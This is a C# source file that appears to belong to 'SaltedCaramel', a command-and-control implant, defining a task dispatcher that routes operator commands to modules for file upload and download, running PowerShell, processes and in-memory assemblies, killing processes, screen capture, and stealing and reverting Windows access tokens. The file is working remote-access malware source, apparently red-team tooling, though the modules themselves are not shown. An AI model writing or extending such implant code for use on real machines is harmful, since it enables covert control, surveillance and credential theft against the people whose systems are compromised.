using System;
using System.Diagnostics;
using SaltedCaramel.Tasks;

namespace SaltedCaramel
{
    /// <summary>
    /// A task to assign to an implant
    /// </summary>
    internal class SCTask
    {
        internal string command { get; set; }
        internal string @params { get; set; }
        internal string id { get; set; }

        public SCTask (string command, string @params, string id)
        {
            this.command = command;
            this.@params = @params;
            this.id = id;
        }

        /// <summary>
        /// Handle a new task.
        /// </summary>
        /// <param name="implant">The CaramelImplant we're handling a task for</param>
        public void DispatchTask(SCImplant implant)
        {
            if (this.command == "cd")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to change directory " + this.@params);
                ChangeDir.Execute(this, implant);
            }
            else if (this.command == "download")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to send file " + this.@params);
                Download.Execute(this, implant);
            }
            else if (this.command == "execute_assembly")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to execute assembly " + this.@params);
                Tasks.Assembly.Execute(this, implant);
            }
            else if (this.command == "exit")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to exit");
                Exit.Execute(this, implant);
            }
            else if (this.command == "get")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to get url " + this.@params);
                Request.Execute(this, implant);
            }
            else if (this.command == "kill")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to kill PID " + this.@params);
                Kill.Execute(this, implant);
            }
            else if (this.command == "upload")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
                Upload.Execute(this, implant);
            }
            else if (this.command == "post")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to post data to url " + this.@params);
                Request.Execute(this, implant);
            }
            else if (this.command == "ps")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
                ProcessList.Execute(this, implant);
            }
            else if (this.command == "ls")
            {
                string path = this.@params;
                Debug.WriteLine("[-] DispatchTask - Tasked to list directory " + path);
                DirectoryList.Execute(this, implant);
            }
            else if (this.command == "powershell")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to run powershell");
                Powershell.Execute(this, implant);
            }
            else if (this.command == "rev2self")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to revert token");
                Token.Revert();
            }
            else if (this.command == "run")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to start process");
                Proc.Execute(this, implant);
            }
            else if (this.command == "screencapture")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to take screenshot.");
                ScreenCapture.Execute(this, implant);
            }
            else if (this.command == "sleep")
            {
                try
                {
                    int sleep = Convert.ToInt32(this.@params);
                    Debug.WriteLine("[-] DispatchTask - Tasked to change sleep to: " + sleep);
                    implant.sleep = sleep * 1000;
                    implant.SendComplete(this.id);
                }
                catch
                {
                    Debug.WriteLine("[-] DispatchTask - ERROR sleep value provided was not int");
                    implant.SendError(this.id, "ERROR: argument provided was not an int.");
                }
            }
            else if (this.command == "steal_token")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to steal token");
                Token.StealToken(this, implant);
            }
        }
    }
}